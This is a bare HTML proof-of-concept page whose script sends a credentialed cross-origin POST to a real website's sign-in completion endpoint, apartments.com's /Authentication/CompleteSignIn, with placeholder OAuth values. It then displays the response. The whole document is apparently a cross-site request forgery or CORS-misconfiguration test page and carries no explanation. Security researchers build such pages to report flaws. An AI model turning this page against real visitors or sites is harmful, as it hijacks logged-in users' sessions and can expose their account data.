<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://www.apartments.com/Authentication/CompleteSignIn", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "code=test&state=test&session_state=test"
})
.then(r => r.text())
.then(data => {
    console.log(data);
    document.body.innerHTML = "<pre>" + data + "</pre>";
})
.catch(err => console.log(err));
</script>
</body>
</html>
